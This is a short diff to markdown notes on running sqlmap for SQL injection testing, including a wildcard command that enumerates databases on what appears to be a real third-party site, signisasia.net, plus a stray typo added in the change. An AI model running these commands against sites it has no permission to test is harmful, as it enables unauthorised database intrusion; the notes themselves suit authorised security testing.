@@ -28,13 +28,16 @@ sqlmap -r req.txt -p username
 
 __Testing a pattern of URL's__
 
--If we have test for a URL scheme injection like 
+-cIf we have test for a URL scheme injection like 
 
 ```console
 http://signisasia.net/books/1/view
 http://signisasia.net/books/2/view
 http://signisasia.net/books/3/view
 ```
+
+- The following URL's can be used to test all the URL's
+
 ```console
 sqlmap -u http://signisasia.net/books/*/view --dbs
 ```
